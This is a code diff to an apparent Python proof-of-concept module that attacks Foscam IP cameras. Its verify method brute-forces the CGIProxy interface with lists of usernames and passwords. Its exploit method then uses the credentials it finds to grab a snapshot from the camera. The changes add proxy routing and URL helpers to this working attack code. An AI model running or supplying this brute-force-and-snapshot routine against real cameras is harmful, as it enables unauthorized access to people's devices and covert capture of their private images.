@@ -18,16 +18,18 @@ class FoscamWeakPassword(POCTemplate):
 
     def verify(self, ip, port=80):
         """Foscam uses URL-based authentication via CGIProxy"""
-        headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
+        headers = self._get_headers()
+        proxies = self._get_proxies()
         for user in self.config.users:
             for password in self.config.passwords:
                 try:
-                    url = f"http://{ip}:{port}/cgi-bin/CGIProxy.fcgi?cmd=getDevInfo&usr={user}&pwd={password}"
+                    url = self._get_url(ip, port, f'/cgi-bin/CGIProxy.fcgi?cmd=getDevInfo&usr={user}&pwd={password}')
                     r = requests.get(
                         url,
                         headers=headers,
                         verify=False,
-                        timeout=self.config.timeout
+                        timeout=self.config.timeout,
+                        proxies=proxies
                     )
                     if r.status_code == 200 and 'result' in r.text:
                         # Foscam returns result=0 on success
@@ -40,7 +42,7 @@ class FoscamWeakPassword(POCTemplate):
     def exploit(self, results):
         ip, port, product, user, password, vul = results
         img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
-        url = f"http://{ip}:{port}/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr={user}&pwd={password}"
+        url = self._get_url(ip, port, f'/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2&usr={user}&pwd={password}')
         return self._snapshot(url, img_file_name)
 
 
